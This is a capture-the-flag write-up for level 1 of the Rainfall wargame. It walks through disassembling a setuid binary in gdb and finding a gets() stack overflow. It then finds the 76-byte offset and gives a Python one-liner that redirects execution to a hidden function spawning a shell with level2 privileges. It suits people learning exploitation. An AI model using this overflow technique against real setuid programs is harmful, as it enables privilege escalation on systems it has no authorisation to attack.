LEVEL 1

When logging as level0 in Rainfall we have a home with an executable called
level1 :

-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1

We can execute it :

level1@RainFall:~$ ./level1
something

It waits for an input from stdin and then nothing.

We can try with different types of arguments :

level1@RainFall:~$ ./level1
something
level1@RainFall:~$ ./level1
123
level1@RainFall:~$ ./level1
!)@#(!@(#

We can also gives an argument using a different syntax :

level1@RainFall:~$ echo "hi" | ./level1
level1@RainFall:~$ echo "12312312321" | ./level1

level1@RainFall:~$ ./level1 < "hi"
-bash: hi: No such file or directory
level1@RainFall:~$ ./level1 < /bin/sh
Segmentation fault (core dumped)
level1@RainFall:~$ ./level1 < level1
Segmentation fault (core dumped)

Ok so we can crash the program with an executable.

Let's open gdb to get more information on that level1:

(gdb) info function
All defined functions:

Non-debugging symbols:
...
0x08048444  run
0x08048480  main
...

We can see the main function and an other one : run

(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.

In the run function there is a call to system :

   0x08048479 <+53>:	call   0x8048360 <system@plt>

It's argument is : 

   0x08048472 <+46>:	movl   $0x8048584,(%esp)

(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"

When we've got a segmentation fault, it means that our buffer overflowed.
But from where does it overflow ?

Let's try to give level1 100 char :

level1@RainFall:~$ ./level1
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Segmentation fault (core dumped)

Let's try that again with gdb :

(gdb) break main
Breakpoint 1 at 0x8048483
(gdb) r
Starting program: /home/user/level1/level1

Breakpoint 1, 0x08048483 in main ()
(gdb) c
Continuing.
Aa0Aa1Aa2iAa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()

it crashed at : 0x63413563

We need to now the value which made the executable overflow.
It's possible to try it manually but there are tools online or metasploit to do
that.

Giving 0x63413563 we know the offset is exactly 76.

63 41 35 63
c  A  5  c

Reversing the endianess : c5Ac and indeed in your input string :
Aa0Aa1Aa2iAa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac | 6Ac7Ac8Ac9Ad0Ad1Ad2A

By filling the buffer we can control the eip.
We can change eip value to the address of the run function : 0x08048444

Let's try it : 

level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"' ; cat) | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)

It worked !
